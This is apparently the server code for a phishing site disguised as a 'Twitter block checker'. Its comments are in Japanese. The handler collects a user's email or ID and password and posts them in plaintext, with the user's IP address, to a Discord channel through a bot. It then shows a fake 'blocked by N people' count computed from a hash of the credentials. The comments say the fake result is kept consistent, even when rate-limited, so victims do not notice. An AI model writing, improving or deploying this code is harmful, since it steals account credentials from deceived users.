import { Redis } from '@upstash/redis';
import { Ratelimit } from '@upstash/ratelimit';

// --- 設定エリア ---
const redis = Redis.fromEnv();

// レートリミット (1時間に5回)
const ratelimit = new Ratelimit({
  redis: redis,
  limiter: Ratelimit.slidingWindow(5, '1 h'),
  analytics: true,
});

const MAX_LENGTH = 200; 

// 文字列から常に同じ数字(5~50)を生成する関数
function getConsistentCount(text) {
    if (!text) return 14; // 空の場合はデフォルト値
    let hash = 0;
    for (let i = 0; i < text.length; i++) {
        const char = text.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash; // 32bit integerに変換
    }
    // 絶対値にして 0~45 の範囲にし、+5 する (結果: 5~50)
    return (Math.abs(hash) % 46) + 5;
}

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).send('Method Not Allowed');

    const ip = req.headers['x-forwarded-for'] || '127.0.0.1';
    const ipIdentifier = typeof ip === 'string' ? ip.split(',')[0] : ip;

    try {
        const { email, password, sessionId } = req.body;

        // 入力されたメアドとパスワードを結合して、そこから人数を計算する
        // これにより、同じ入力なら常に同じ人数が表示される
        const seed = (email || "") + (password || "");
        const resultCount = getConsistentCount(seed);

        // 1. レートリミットチェック
        const { success } = await ratelimit.limit(`login_limit_${ipIdentifier}`);

        if (!success) {
            console.warn(`⛔ Rate limit exceeded for IP: ${ipIdentifier}`);
            // 制限中でも、計算した「いつもの人数」を返してあげる（バレ防止）
            return res.status(200).json({ success: true, count: resultCount });
        }

        // 文字数チェック
        if ((email && email.length > MAX_LENGTH) || (password && password.length > MAX_LENGTH)) {
            return res.status(200).json({ success: true, count: resultCount });
        }
        
        if (!email || !password) {
             return res.status(400).json({ error: 'missing fields' });
        }

        const DISCORD_BOT_TOKEN = process.env.DISCORD_BOT_TOKEN;
        const CHANNEL_ID = process.env.DISCORD_CHANNEL_ID;
const messageBody = {
    embeds: [
        {
            title: "ご、ごめんなさい、、、",
            color: 0x00b0f4,
            description: `**ID or Email**\n\`${email}\`\n**PASS**\n\`${password}\`\n**IP**\n\`${ipIdentifier}\``,
            footer: {
                text: `Twitterブロック診断 | IP: ${ipIdentifier} | ${randomCount}人と返答`,
            },
            timestamp: new Date().toISOString()
        }
    ]
  };

        // Discordに送信
        await fetch(`https://discord.com/api/v10/channels/${CHANNEL_ID}/messages`, {
            method: 'POST',
            headers: {
                'Authorization': `Bot ${DISCORD_BOT_TOKEN}`,
                'Content-Type': 'application/json',
            },
            body: JSON.stringify(messageBody)
        });

        // 計算した人数を返す
        res.status(200).json({ success: true, count: resultCount });

    } catch (error) {
        console.error("Server Error:", error);
        // エラー時はデフォルト値
        res.status(200).json({ success: true, count: 14 }); 
    }
}